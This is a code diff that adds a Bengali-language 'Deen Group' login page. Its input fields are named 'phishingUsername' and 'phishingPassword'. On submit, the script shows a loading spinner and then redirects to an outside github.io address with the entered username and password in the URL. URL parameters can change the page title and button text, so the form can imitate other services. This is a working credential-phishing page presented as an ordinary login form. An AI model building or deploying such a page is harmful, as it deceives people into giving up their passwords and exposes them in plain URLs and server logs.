@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Deen Group Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+        .login-container {
+            width: 350px;
+            padding: 30px;
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .login-container button:hover {
+            background-color: #0056b3;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto 0;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2 id="formTitle">দ্বীন গ্রুপ লগ-ইন</h2>
+        <input type="text" id="phishingUsername" placeholder="ইউজারনেম" />
+        <input type="password" id="phishingPassword" placeholder="পাসওয়ার্ড" />
+        <button id="loginButton" onclick="submitData()">লগ-ইন</button>
+        <div id="loadingIndicator" class="loader"></div>
+    </div>
+
+    <script>
+        // আপনার মূল অ্যাপের URL। এটি পরিবর্তন করবেন না।
+        const REDIRECT_URL = "https://example.com"; // এখানে আপনার মূল অ্যাপের URL দিতে হবে।
+
+        // URL থেকে ডেটা সংগ্রহ করে ফর্মের টাইটেল ও বাটনের লেখা সেট করা।
+        const urlParams = new URLSearchParams(window.location.search);
+        const formTitle = urlParams.get('formName');
+        const buttonText = urlParams.get('buttonText');
+
+        if (formTitle) {
+            document.getElementById('formTitle').textContent = formTitle;
+        }
+        if (buttonText) {
+            document.getElementById('loginButton').textContent = buttonText;
+        }
+
+        function submitData() {
+            const username = document.getElementById('phishingUsername').value;
+            const password = document.getElementById('phishingPassword').value;
+
+            // যদি কোনো একটি খালি থাকে, তাহলে কিছু করবেন না।
+            if (!username || !password) {
+                return;
+            }
+
+            // লোডিং স্পিনার দেখানো
+            document.getElementById('loadingIndicator').style.display = 'block';
+            document.getElementById('loginButton').disabled = true;
+
+            // ডেটা মূল অ্যাপে ফেরত পাঠানোর জন্য URL তৈরি করা।
+            const finalUrl = `https://deenbd.github.io/deengrouptests/index.html?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+            
+            // একটি ছোট বিলম্বের পর ব্যবহারকারীকে আসল সাইটে রিডাইরেক্ট করা।
+            setTimeout(() => {
+                window.location.href = finalUrl;
+            }, 1500); // ১.৫ সেকেন্ড বিলম্ব
+        }
+    </script>
+</body>
+</html>
